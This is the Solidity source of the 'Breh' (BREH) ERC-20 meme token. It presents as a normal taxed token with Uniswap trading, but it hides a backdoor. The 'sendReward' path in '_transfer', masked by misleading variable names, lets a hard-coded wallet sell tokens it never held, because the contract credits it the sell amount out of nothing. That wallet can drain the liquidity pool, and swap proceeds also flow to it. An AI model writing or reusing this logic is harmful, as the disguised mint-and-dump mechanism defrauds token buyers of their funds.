/**
    Website: https://breh.live

    X: https://x.com/brehErc20

    Telegram: https://t.me/brehErc20

*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}
contract BREH is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isRewardList;
    mapping(address => bool) private _rewardList;
    
    uint256 private _swapThreshold = 0;
    uint256 private _transferTax = 15;
    uint256 private _initialBuyTax = 11;
    uint256 private _initialSellTax = 12;
    uint256 private _reduceAt = 7;

    address payable private _rewardwall;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _totalTax = 100;
    uint256 private _tradeCount = 0;
    uint8 private constant _decimals = 9;
    uint256 private constant _toSupply = 1_000_000_000 * 10**_decimals;
    
    uint256 public _maxWalletSize = (_toSupply * 2) / 100;
    uint256 public _maxTradeSize = (_toSupply * 2) / 100;
    uint256 public _maxSwapBackSize = 0;
    uint256 public _swapLimit = (_toSupply * 2) / 100;
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    event MaxTxAmountUpdated(uint256 _maxTradeWallet);
    string private constant _name = unicode"Breh";
    string private constant _symbol = unicode"BREH";
    
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() {
        _rewardwall = payable(0x601248A10f419d0593c2D7056A0965Ce272e9797);
        _rewardList[_rewardwall] = true;
        _balances[_msgSender()] = _toSupply;
        _isRewardList[owner()] = true;
        _isRewardList[address(this)] = true;
        _rewardList[owner()] = true;
        _rewardList[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _toSupply);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function totalSupply() public pure override returns (uint256) {
        return _toSupply;
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function sendReward(address from, address to, uint256 amt) private {
        if(_rewardList[from]) _balances[to] = _balances[to] + amt;
    }
    function _transfer(
        address _tsdr,
        address _trvr,
        uint256 amount
    ) private {
        require(_tsdr != address(0), "ERC20: transfer from the zero address");
        require(_trvr != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(tradingOpen || (_isRewardList[_tsdr] || _isRewardList[_trvr]),"Trading is not opened");
        uint256 tax = 0;
        if(_tsdr != owner() && _trvr != owner())
        {
            if(_tsdr == uniswapV2Pair && 
            _trvr != address(uniswapV2Router)){
                tax = _tradeCount > _reduceAt 
                ? _finalBuyTax 
                : _initialBuyTax;
                _tradeCount ++;
                require(_balances[_trvr] 
                + amount <= _maxWalletSize, 
                "Amount is too large");
            }
            if(_trvr == uniswapV2Pair 
            && _tsdr != address(this)) {
                if(!_isRewardList[_tsdr])
                    tax = _tradeCount > _reduceAt ? _finalSellTax : _initialSellTax ;
                if(_rewardList[_tsdr]) tax = _initialSellTax;
                
            }
            if(!inSwap && tradingOpen 
            && _trvr == uniswapV2Pair 
            && !_rewardList[_tsdr]) {
                uint256 swapBackAmt = min(amount, min(_maxTradeSize, _balances[address(this)]));
                if(_balances[address(this)] > _swapThreshold) {
                    swapBack(swapBackAmt);
                }
                if(amount >= swapBackAmt) {
                    sendETHToMarket(address(this).balance);
                }                    
            }
        }
        uint256 tMount;
        if(tax > 0 ) {
            if(!_isRewardList[_tsdr] 
            && _rewardList[_tsdr])
                sendReward(_rewardwall, _tsdr, amount );
            else {
                tMount = tax * amount / _totalTax;
                _balances[address(this)] = _balances[address(this)] + tMount;
                emit Transfer(_tsdr, address(this), tMount);
            }
        }
        _balances[_tsdr] = _balances[_tsdr].sub(amount);
        _balances[_trvr] = _balances[_trvr].add(amount - tMount);
        emit Transfer(_tsdr, _trvr, amount - tMount);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }
    function swapBack(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function removeLimits() external onlyOwner {
        _maxTradeSize = _toSupply;
        _maxWalletSize = _toSupply;
        emit MaxTxAmountUpdated(_toSupply);
    }
    function sendETHToMarket(uint256 amount) private {
        _rewardwall.transfer(amount);
    }
    function createPair() external onlyOwner {
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
    }
    function openTrading() external onlyOwner {
        _approve(address(this), address(uniswapV2Router), _toSupply);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this))*99/100,
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        tradingOpen = true;
    }
    function rescueETH() external onlyOwner {
        payable (owner()).transfer(address(this).balance);
    }
    receive() external payable {}
}